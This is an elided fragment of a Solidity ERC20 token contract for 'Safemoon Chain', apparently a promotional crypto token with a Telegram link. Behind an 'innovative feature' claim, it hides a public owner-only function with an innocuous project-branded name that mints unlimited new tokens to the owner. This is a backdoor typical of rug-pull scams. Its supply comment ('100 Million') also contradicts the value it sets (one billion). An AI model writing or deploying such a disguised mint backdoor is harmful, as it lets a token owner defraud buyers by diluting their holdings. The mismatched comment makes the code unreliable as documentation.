...
//
// $SafemoonChain proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SafemoonChain
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SafemoonChain(uint256 amount) public onlyOwner {
 _SafemoonChain(msg.sender, amount);
    }
    ...
    function _SafemoonChain(address account, uint256 amount) internal virtual {
...
contract $SafemoonChain is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Safemoon Chain", "SAFEMOONCHAIN") {
     _SafemoonChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}